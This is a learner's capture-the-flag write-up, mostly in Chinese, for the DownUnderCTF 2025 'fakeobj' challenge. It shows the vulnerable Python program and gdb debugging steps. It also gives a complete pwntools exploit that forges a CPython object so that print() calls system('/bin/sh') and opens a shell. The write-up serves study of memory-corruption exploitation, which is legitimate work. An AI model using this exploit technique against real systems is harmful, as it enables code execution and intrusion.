# 1.0 Challenge
1. how to debug python script
2. how to overwrite python 3.9 obj?
# 2.0 Analysis
source code 
最神奇是 这个是python based 题目
我没有很明白 这个题目在讲什么

这是一个 Python 程序，它做了以下几件事：
1. 创建一个空的字典对象：`obj = {}`
2. 打印出这个字典对象在内存中的地址：`hex(id(obj))`
3. 加载 libc 的地址，并打印出 `system()` 函数的地址
4. 然后，它让你输入一串 hex 编码的数据（72字节）
5. 它**用你输入的内容，直接覆盖字典对象内存**！
6. 最后，程序执行：`print(obj)`（试图触发输出）

好像是 要用 python debug 然后在
PyDictObject
里面的做什么东西？？？？
```python
#!/usr/bin/env python3

import ctypes

obj = {}
print(f"addrof(obj) = {hex(id(obj))}")

libc = ctypes.CDLL(None)
system = ctypes.cast(libc.system, ctypes.c_void_p).value
print(f"system = {hex(system or 0)}")

fakeobj_data = bytes.fromhex(input("fakeobj: "))
for i in range(72):
    ctypes.cast(id(obj), ctypes.POINTER(ctypes.c_char))[i] = fakeobj_data[i]

print(obj)
```

# 3.0 Solution

## 3.1 how to debug python
先run program 了 然后check pid 然后用gdb debug
```
1.
ps aux | grep python

salad    12345  0.0  0.2  123456  6543 pts/1    S+   03:21   0:00 python3 vuln.py

2.
gdb -p 12345
```
## 3.2 how to overwrite python 3.9 obj?

现在我是可以enter 72 bytes 进 obj 
所以我可以做一个fake obj 
现在我们有obj leak address 和 system address 

官方解答 (认真讲 我看不懂)
修改 `ob_type` 使 `tp_repr` 指向我们构造的结构 → `print(obj)` 调用了 `tp_repr`，但此时 `tp_repr` = `system`，arg = "/bin/sh"

这个人讲到 很细
https://blog.kittycar.online/posts/2025/07/20/ductf-2025-fakeobject/

# 4.0 FLAG 
不理解 但是有script 有机会 会回来
# 5.0 FINAL SCRIPT 
```python
from pwn import *

# conn = process(['python3', '../publish/fakeobj.py'])
conn = remote('0.0.0.0', 1337)

addrof_obj = int(conn.recvline().decode().split(' = ')[1], 16)
system = int(conn.recvline().decode().split(' = ')[1], 16)
log.success(f'addrof(obj) = {hex(addrof_obj)}')
log.success(f'system = {hex(system)}')

payload = flat([
    b'.bin/sh\x00', # ob_refcnt, will be refcnt inc'd then called as tp_repr arg
    p64(addrof_obj - 88 + 16), # set ob_type such that tp_repr points to obj+24
    p64(system), # tp_repr will point to this, so we call system("/bin/sh") !
], length=72, filler=b'\x00')
conn.sendlineafter('fakeobj: ', payload.hex().encode())

conn.interactive()
```

# 6.0 REFERENCE

OFFICIAL 
https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/pwn/fakeobj.py/solve/solv.py

VULN 
https://vulnx.github.io/blog/posts/DUCTF2025/